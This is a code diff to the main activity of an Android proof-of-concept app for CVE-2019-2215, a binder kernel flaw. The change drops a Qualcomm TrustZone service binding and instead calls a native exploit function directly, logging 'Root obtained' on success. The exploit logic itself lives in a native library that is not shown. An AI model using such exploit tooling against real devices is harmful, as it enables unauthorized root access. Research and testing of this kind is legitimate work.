@@ -36,15 +36,10 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
-    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
-    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
-
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
-    private IMinkSocketFd tzService;
-    private boolean isBound = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
@@ -53,33 +48,8 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    public static native int nativeExploitCVE20192215Epoll();
-
-    private ServiceConnection tzConnection = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            tzService = IMinkSocketFd.Stub.asInterface(service);
-            if (tzService != null) {
-                appendLog("[TZ] Service bound");
-                updateStatus("Bound - starting exploit");
-                enableButtons(false, true);
-                stopRequested.set(false);
-                testThread = new Thread(() -> executeExploit());
-                testThread.start();
-            } else {
-                appendLog("[TZ] Failed to cast");
-                enableButtons(true, false);
-            }
-        }
-
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            tzService = null;
-            isBound = false;
-            enableButtons(true, false);
-            updateStatus("Disconnected");
-        }
-    };
+    // JNI 関数（TZ サービスを使わない）
+    public static native int nativeExploitCVE20192215();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -97,7 +67,8 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(true);
                 enableButtons(false, true);
                 stopRequested.set(false);
-                bindService();
+                testThread = new Thread(() -> executeExploit());
+                testThread.start();
             }
         });
         btnStop.setOnClickListener(v -> {
@@ -112,7 +83,7 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(false);
             }
         });
-        appendLog("App started. Press 'Start' to begin.");
+        appendLog("Binder POC started. Press Start.");
     }
 
     private void requestPermissions() {
@@ -131,29 +102,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void bindService() {
-        try {
-            Intent intent = new Intent();
-            intent.setClassName(TARGET_PKG, TARGET_CLS);
-            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
-            if (ret) {
-                appendLog("Binding service...");
-                updateStatus("Binding...");
-                isBound = true;
-            } else {
-                appendLog("bindService failed");
-                updateStatus("Bind failed");
-                enableButtons(true, false);
-                isTesting.set(false);
-            }
-        } catch (Exception e) {
-            appendLog("Bind exception: " + e.toString());
-            updateStatus("Exception");
-            enableButtons(true, false);
-            isTesting.set(false);
-        }
-    }
-
     private void enableButtons(boolean startEnabled, boolean stopEnabled) {
         handler.post(() -> {
             btnStart.setEnabled(startEnabled);
@@ -163,10 +111,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== CVE-2019-2215 epoll FINAL ==========");
+        appendLog("========== CVE-2019-2215 EXPLOIT ==========");
 
-        appendLog("[*] Triggering epoll-based exploit...");
-        int result = nativeExploitCVE20192215Epoll();
+        appendLog("[*] Triggering exploit (no TZ service)");
+        int result = nativeExploitCVE20192215();
 
         if (result == 0) {
             appendLog("[+] Exploit SUCCESS! Root obtained.");
@@ -214,15 +162,15 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "cve_2019_2215_epoll_log.txt");
+            File file = new File(dir, "binder_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== CVE-2019-2215 epoll Log ===");
+                pw.println("=== Binder POC Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
                 pw.flush();
             }
-            appendLog("Log saved");
+            appendLog("Log saved to " + file.getAbsolutePath());
         } catch (Exception e) {
             appendLog("Save failed: " + e.getMessage());
         }
@@ -243,7 +191,6 @@ public class MainActivity extends AppCompatActivity {
         super.onDestroy();
         stopRequested.set(true);
         if (testThread != null) testThread.interrupt();
-        if (isBound) unbindService(tzConnection);
         saveLog();
     }
 }
